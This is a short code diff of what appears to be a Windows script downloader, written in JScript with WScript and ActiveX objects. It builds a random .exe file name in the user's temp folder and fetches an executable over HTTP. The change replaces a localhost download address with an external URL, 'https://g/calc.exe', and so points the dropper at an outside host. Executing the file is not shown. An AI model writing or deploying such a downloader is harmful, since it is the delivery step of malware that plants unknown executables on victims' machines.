@@ -13,7 +13,7 @@
                 var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
                 var randomName = Math.random().toString(36).substring(2) + ".exe";
                 var filePath = tempPath + "\\" + randomName;
-                var url = "http://localhost:8080/calc.exe";
+                var url = "https://g/calc.exe";
                 var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
                 xmlHttp.open("GET", url, false);
                 xmlHttp.send();
